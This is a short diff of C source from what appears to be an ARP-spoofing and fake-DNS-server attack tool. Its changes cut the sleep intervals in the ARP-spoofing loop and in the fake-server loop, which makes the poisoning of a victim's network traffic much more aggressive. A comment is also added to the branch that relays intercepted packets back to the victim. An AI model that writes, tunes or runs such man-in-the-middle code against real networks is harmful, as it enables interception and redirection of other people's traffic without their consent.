@@ -34,7 +34,7 @@ void *dnsf_ckr_arp_spoofing_bot_routine(void *vargs) {
             sprintf(spf_ip, "%s", inet_ntoa(src_in));
             sprintf(dest_ip, "%s", inet_ntoa(dest_in));
             dnsf_ckr_spoof_mac(lo_mac, spf_ip, tp->victim->hw_addr, dest_ip, sent_nr, 100);
-            sleep(5);
+            usleep(10);
         }
     }
     free(lo_mac);
@@ -63,7 +63,7 @@ void *dnsf_ckr_fakeserver_bot_routine(void *vargs) {
                     action = dnsf_ckr_proc_ip_packet(p->data + 14, p->dsize - 14, &rawpkt, &rawpktsz, transactions, fakeserver, src_mac);
                 }
                 switch (action) {
-                    case dnsf_ckr_action_repass:
+                    case dnsf_ckr_action_repass: //  here we only will repass and the layer-1 will be already corrected.
                         //  INFO(Santiago): don't touch... just echoing to the victim's machine what we grabbed..
                         //  ..but first we need to correct the ethernet frame.
                         action = dnsf_ckr_proc_eth_frame(p->data, p->dsize, &rawpkt, &rawpktsz, transactions);
@@ -97,7 +97,7 @@ void *dnsf_ckr_fakeserver_bot_routine(void *vargs) {
                 packets = NULL;
             }
         }
-        usleep(20);
+        usleep(1);
     }
     return NULL;
 }
